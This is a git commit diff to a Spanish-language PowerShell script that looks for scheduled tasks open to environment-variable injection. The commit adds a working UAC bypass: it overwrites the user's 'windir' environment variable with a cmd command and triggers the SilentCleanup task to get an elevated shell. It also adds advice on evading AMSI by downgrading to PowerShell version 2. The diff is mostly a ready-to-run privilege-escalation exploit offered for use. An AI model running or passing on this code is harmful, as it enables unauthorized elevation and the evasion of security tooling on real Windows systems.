421a2f47aa7de43fe975d3233ecec42dac7c7a3a
alvarosanz1993 <63511997+alvarosanz1993@users.noreply.github.com>
2022-01-22 19:58:54 +0100

    Update scheduled_task_uac_bypass_recon.ps1

--- scheduled_task_uac_bypass_recon.ps1
+++ scheduled_task_uac_bypass_recon.ps1
@@ -1,3 +1,7 @@
+echo "recomendaciones en caso de que no funcione:"
+echo "1. ejecutarlo como powershell -noexit <nombre del script>"
+echo "2. si amsi esta bloqueando la ejecucion del script, se recomienda hacer downgrade de powershell con el comando powershell -version 2"
+
 echo "Identificando tareas programadas debiles a una inyeccion de variables de entorno..."
 $task = Get-ScheduledTask |
   Where-Object { $_.State -ne "Disabled" -and
@@ -12,3 +16,9 @@ echo "Identificando el nombre de las variables de entorno debiles..."
 $pattern = '(?<=\%).+?(?=\%)'
 $testText = $task | ForEach-Object {(Get-ScheduledTask $_.TaskName).Actions[0]} | ForEach-Object {[regex]::Matches($_.Execute, $pattern).Value}
 $testText
+
+echo "Creando la clave de registro necesaria..."
+Set-ItemProperty -Path HKCU:\Environment -Name windir -Value 'cmd /k "%1" %*' -Force
+
+echo "Ejecutando la tarea programada..."
+schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
